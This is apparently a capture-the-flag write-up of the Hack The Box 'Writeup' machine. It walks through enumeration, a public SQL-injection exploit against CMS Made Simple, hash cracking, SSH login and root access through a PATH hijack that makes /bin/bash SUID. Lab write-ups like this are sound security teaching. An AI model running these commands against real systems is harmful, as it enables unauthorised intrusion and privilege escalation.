# Writeup!
## #Author : M3tr1c_r00t

![Writeup](https://user-images.githubusercontent.com/99975622/212437498-4f732051-1d7d-4bfc-97ff-c9ebd1538946.png)

Writeup is an easy linux box which is vulnerable to cms made simple 2.2.9.1 Sql injection to try and get creds which we can use to login into ssh.

### Enumeration...
```
# Nmap 7.92 scan initiated Thu Nov 24 15:28:50 2022 as: nmap -sC -sV -A -v -oN nmapscan.txt 10.129.63.149
Nmap scan report for 10.129.63.149
Host is up (0.24s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Nothing here yet.
| http-robots.txt: 1 disallowed entry 
|_/writeup/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Nov 24 15:29:27 2022 -- 1 IP address (1 host up) scanned in 36.72 seconds
```

Unfortunately, we cannot run a directory bruteforce as the server is going to block/ ban our ip.
We can try visiting the server ....

![image](https://user-images.githubusercontent.com/99975622/212437587-8eff1222-88f9-4268-aa5b-a5eb17368585.png)

Unfortunately, if we try to do a directory bruteforce, our ip will be blocked off.
<br>So, i tried writeup directory due to the name of the box, and it worked...
![image](https://user-images.githubusercontent.com/99975622/212437835-62a89e6a-0988-4ee7-a6a2-f434bcbb084e.png)

If we check the source code, we see the server is running on a CMS known as CMS made simple...
![image](https://user-images.githubusercontent.com/99975622/212437890-b41f05c6-dad2-435a-8d74-30512ce5d3af.png)
With that info,we need to look for the version.
<br>So, after googling around, we get the server directory format as CMS made simple is open simple
![image](https://user-images.githubusercontent.com/99975622/212437982-5a41c601-905a-48a4-9e06-9944b845db78.png)

You can download thier demo server zip or just check it out from their other directory...
```
http://svn.cmsmadesimple.org/svn/cmsmadesimple/trunk/
```
![image](https://user-images.githubusercontent.com/99975622/212438063-2aec6162-24b9-4977-a619-fe8061e7056b.png)
And if we move to the /doc/CHANGELOG.txt file, we can see our file version...
![image](https://user-images.githubusercontent.com/99975622/212438147-be3eb7a4-c8f3-4dd7-9003-940b375755ba.png)
With that info, we can head on over to google and look for a public exploit for the version or check using searchsploit...
![image](https://user-images.githubusercontent.com/99975622/212438227-d0258d38-d9af-4f70-95cc-b3c1aa7034aa.png)

We can copy the script into a python file then run it...

```
./script.py -u http://10.10.10.138/writeup --crack --wordlist /usr/share/wordlists/rockyou.txt
```

Since the script added an extra bit at the end of the md5 hash, we need to crack the passwordsuing hashcat...
![Screenshot_2022-11-24_16_52_14](https://user-images.githubusercontent.com/99975622/212438450-10c338e3-c3ce-4075-964c-49aee92b9c00.png)

Cracking with hashcat...
Adding the hash and salt in the same file...
![Screenshot_2022-11-24_17_02_48](https://user-images.githubusercontent.com/99975622/212438504-fa95700e-0bbb-4d5b-aee6-99ac2cc9f38b.png)

Cracking...
![Screenshot_2022-11-24_17_03_57](https://user-images.githubusercontent.com/99975622/212438514-49cb97b1-f219-4e32-bcd8-bce9ad6388f2.png)

Now that we've cracked the password, we need to login into the box using ssh and get the user flag...

### Priv Esc...
#### Unintended method...
After running linpeas, the box is vulnerable to CVE-2021-4034 ....
![Screenshot_2022-11-24_17_12_13](https://user-images.githubusercontent.com/99975622/212438729-a9d3f6b5-d0eb-4962-88dd-cb8dc0902ce6.png)

And we are root...
![Screenshot_2022-11-24_17_13_19](https://user-images.githubusercontent.com/99975622/212438795-f87b1de7-543b-45a3-8536-89732832319b.png)

#### Intended method...
Afte running pspy, we can see there is a message of the day being run without a full directory path being specified...
![Screenshot_2022-11-24_17_27_27](https://user-images.githubusercontent.com/99975622/212438935-62509dee-0ca9-4a75-9405-8ed56cea1325.png)

We can make our own script called run-parts and make the /bin/bash binary suid executable then move it to the /usr/local/bin directory...
```
echo "chmod +s /bin/bash " > run-parts
chmod +x run-parts
mv run-parts /usr/local/bin
```

In my case, i wrote a reverse shell script to get a shell as root...
![Screenshot_2022-11-24_17_30_57](https://user-images.githubusercontent.com/99975622/212439240-f8df929a-9b5b-4d0b-9f96-212490ff42d0.png)
Set up your listener...
<br>So, if we logoff and login once again, we will be able to get a reverse shell as root...
![Screenshot_2022-11-24_20_18_43](https://user-images.githubusercontent.com/99975622/212439324-177ef30f-9b56-4c3b-befa-1e85d426edae.png)
And done!

### Socials
@instagram:https://instagram.com/Metric_r00t
<br> Twitter:https://twitter.com/M3tr1c_root
